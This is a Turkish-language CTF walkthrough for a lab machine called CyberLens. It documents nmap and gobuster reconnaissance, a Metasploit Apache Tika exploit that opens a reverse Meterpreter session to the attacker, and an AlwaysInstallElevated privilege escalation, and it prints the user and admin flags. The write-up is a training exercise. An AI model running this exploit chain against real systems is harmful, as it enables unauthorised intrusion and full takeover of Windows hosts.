# CyberLens CTF

## 1.Adım Ping Taraması
```bash
ping Machine_IP
```
## 2.Adım Nmap Taraması
```bash
nmap --top-port 100 -sV Machine_IP
```
Nmap Sonucu:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 15:44 EDT
Nmap scan report for 10.10.147.226
Host is up (0.062s latency).
Not shown: 96 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## 3.Adım  SMB Protokolü İçin Script Taraması 
```bash
nmap --script="smb-vuln-*" Machine_IP
```
```bash
Çıktısı: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 15:46 EDT
Nmap scan report for cyberlens.thm (Machine_IP)
Host is up (0.061s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
```
## 4. Adım Hosts Dosyasını Güncelleme
/etc/hosts dosyasına makineyi ekledim.
```bash
sudo echo '10.10.147.226 cyberlens.thm' >> /etc/hosts
```
## 5. Adım Dizin Taraması
```bash
gobuster dir -u http://Machine_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```
Sonuç:
```bash
/images               (Status: 301) [Size: 236] [--> http://10.10.147.226/images/]
/Images               (Status: 301) [Size: 236] [--> http://10.10.147.226/Images/]
/css                  (Status: 301) [Size: 233] [--> http://10.10.147.226/css/]                                                                           
/js                   (Status: 301) [Size: 232] [--> http://10.10.147.226/js/]                                                                            
/IMAGES               (Status: 301) [Size: 236] [--> http://10.10.147.226/IMAGES/]                                                                        
```
## 6.Adım Apache Tika Exploit'i Kullanarak Sistem Erişimi
Dizinlerin birinde Apache Tika'nın versiyonunu belirledikten sonra, msfconsole kullanarak zaafiyeti bulup exploit ettim.
Exploiti Arama: 
```bash
msf6> search apache tika
```
Exploit Ayarları:
```bash
msf6>use 0
msf6 exploit(windows/http/apache_tika_jp2_jscript)>set LHOST <your tun0 IP>
set RHOST Machine_IP
set RPORT 61777
run
```
## 7. Adım Sisteme Erişim
Meterpreter geldi, shell alarak sisteme girdim ve user flag'ini yakaladım.
```bash
C:\Users\CyberLens\Desktop>type user.txt
THM{T1k4-CV3-f0r-7h3-w1n}
```
## 8. Adım Privilege Escalation (Root)
local_exploit_suggester modülü ile root olmak için uygun exploit'leri inceledim ve always_install_elevated exploit'ini kullandım.
```bash
msf6 exploit(windows/http/apache_tika_jp2_jscript) > search local_exploit_suggester
msf6 exploit(exploit(windows/http/apache_tika_jp2_jscript)) > use 0
msf6 post(multi/recon/local_exploit_suggester) > set session Session_ID
msf6 post(multi/recon/local_exploit_suggester) > run
```
```bash
msf6 post(multi/recon/local_exploit_suggester) > use windows/local/always_install_elevated
msf6 exploit(windows/local/always_install_elevated) > options
msf6 exploit(windows/local/always_install_elevated) > set session Sessıon_ID 
msf6 exploit(windows/local/always_install_elevated) > run
```
Sonuç:
```bash
meterpreter > shell
cd \Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type admin.txt
THM{3lev@t3D-4-pr1v35c!}
```
